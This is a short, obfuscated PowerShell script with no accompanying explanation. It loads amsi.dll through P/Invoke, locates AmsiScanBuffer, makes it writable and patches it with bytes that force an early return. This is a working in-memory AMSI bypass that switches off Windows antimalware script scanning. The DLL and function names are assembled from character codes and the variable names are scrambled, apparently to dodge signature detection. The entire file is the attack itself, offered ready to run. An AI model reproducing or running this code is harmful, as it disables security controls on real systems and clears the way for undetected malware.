$Xxac_XzBger8zAoEwC1X = @"
using System;
using System.Runtime.InteropServices;
public class Xxac_XzBger8zAoEwC1X {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr cUQHUVlEBG, string dUKOahTP0H7HPEJrMWgy);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr KZtVEzzlz, UIntPtr R_d3UJbYY6VAqkw9, uint AoXTBc, out uint Oca9niM);
}
"@

Add-Type $Xxac_XzBger8zAoEwC1X

$D39SDoWkkk = [Xxac_XzBger8zAoEwC1X]::LoadLibrary("$([chAr]([bytE]0x61)+[Char]([ByTE]0x6d)+[CHaR](115)+[chAr]([ByTe]0x69)+[Char]([bytE]0x2e)+[ChaR]([BYTe]0x64)+[CHAR]([ByTe]0x6c)+[chAr](39+69))")
$FunSCD = [Xxac_XzBger8zAoEwC1X]::GetProcAddress($D39SDoWkkk, "$([char](65)+[CHAr]([bYTE]0x6d)+[CHAR]([bYTe]0x73)+[cHar]([bytE]0x69)+[cHAR](18+65)+[CHaR](99)+[Char]([bYtE]0x61)+[cHar](110+22-22)+[cHAr]([bytE]0x42)+[chAR](117)+[ChaR]([BYTe]0x66)+[CHAR](91+11)+[Char](101+45-45)+[CHar](114*4/4))")
$p = 0
[Xxac_XzBger8zAoEwC1X]::VirtualProtect($FunSCD, [uint32]5, 0x40, [ref]$p)
$MvlmNdMEOKN9 = "0xB8"
$F6jVNaC4nF = "0x57"
$GFigODOKNa = "0x00"
$HWWIoH8Pd5 = "0x07"
$ed3GNnRZfGbzu = "0x80"
$MTLju__kKEr = "0xC3"
$CTymh7gMN72nWot = [Byte[]] ($MvlmNdMEOKN9,$F6jVNaC4nF,$GFigODOKNa,$HWWIoH8Pd5,+$ed3GNnRZfGbzu,+$MTLju__kKEr)
[System.Runtime.InteropServices.Marshal]::Copy($CTymh7gMN72nWot, 0, $FunSCD, 6)